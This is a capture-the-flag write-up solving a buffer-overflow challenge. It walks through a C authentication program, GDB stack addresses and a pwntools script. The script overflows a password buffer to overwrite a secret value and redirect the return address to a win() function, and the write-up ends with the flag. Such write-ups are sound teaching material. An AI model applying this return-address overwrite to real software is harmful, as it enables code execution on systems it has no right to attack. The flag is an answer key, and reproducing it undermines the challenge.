# m

## Description
> m

Tags: _pwn_

## Recon

I was given a C program that implements a basic authentication system. The program requires:
1. Username to be "admin"
2. A secret number to equal `0xDEADBEEF`

Looking at the code, I identified several issues:

### Issue 1

```c
unsigned int seed;
if (getrandom(&seed, sizeof(seed), 0) == -1) {
    puts("Error getting random number");
    exit(2);
}
srand(seed);
unsigned int secret_number = rand() % 16535;
```

The `secret_number` is generated randomly (0-16534), so it will never equal `0xDEADBEEF`

### Issue 2

```c
char username[010];  // Octal 010 = decimal 8 bytes
char password[040];  // Octal 040 = decimal 32 bytes

puts("Username:");
readInput(username, 010);

puts("Password:");
readInput(password, 0x40);  // Hex 0x40 = decimal 64 bytes
```

The `password` buffer is only 32 bytes, but `readInput` allows writing 64 bytes

### Issue 3

```c
void win() {
    FILE *file;
    char c = 0;
    file = fopen("/flag.txt", "r");
    // ... prints flag ...
}
```

There's a `win()` function that reads and prints the flag, but the code comment says:
```c
// still under construction
// TODO:
// call openFlag
```

Even if I pass the authentication check, it doesn't call the flag function

## Exploitation

### Stack Layout

Using GDB, I examined the stack to understand variable locations:

```bash
(gdb) p &username
$1 = (char (*)[8]) 0x7fffffffa7b4

(gdb) p &password
$2 = (char (*)[32]) 0x7fffffffa790

(gdb) p &secret_number
$3 = (unsigned int *) 0x7fffffffa7bc
```

Stack layout:
```
0x7fffffffa790: password (32 bytes)
0x7fffffffa7b4: username (8 bytes)
0x7fffffffa7bc: secret_number (4 bytes)
...
return address (8 bytes, somewhere higher)
```

### Win Function Address

Using `objdump`, I located the `win()` function:

```bash
objdump -t challenge | grep " win"
0000000000401ca5 g     F .text	0000000000000086 win
```

The `win()` function is at address `0x401ca5`

### Exploit

1. Enter "admin" as username (legit)
2. Overflow the password buffer to:
   - Overwrite `username` with "admin"
   - Overwrite `secret_number` with `0xDEADBEEF`
   - Overwrite the return address with `win()` address

```python
from pwn import *

HOST = "xxx.vuln.gg"
PORT = 443
WIN_ADDR = 0x401ca5

username = b"admin"
padding = b"\x00"

payload = (
    b"A" * 36 +           # Fill password buffer + reach username
    username +             # Overwrite username with "admin"
    padding * 3 +          # Padding
    p32(0xDEADBEEF) +     # Overwrite secret_number
    padding * 8 +          # Padding to reach return address
    p64(WIN_ADDR)         # Overwrite return address with win()
)

r = remote(HOST, PORT, ssl=True)

r.recvuntil(b"Username:")
r.sendline(username)

r.recvuntil(b"Password:")
r.sendline(payload)

print(r.recvall(timeout=3).decode())
```

Username is set to "admin" (satisfies first check)
Password overflow overwrites `secret_number` to `0xDEADBEEF` (satisfies second check)
Return address is overwritten with `win()`, so when the function tries to return, it jumps to `win()` instead
`win()` reads and prints the flag

## Flag

`CLA{my_v3ry_f1rst_b0f_challenge_da5BWQMZRmU1}`
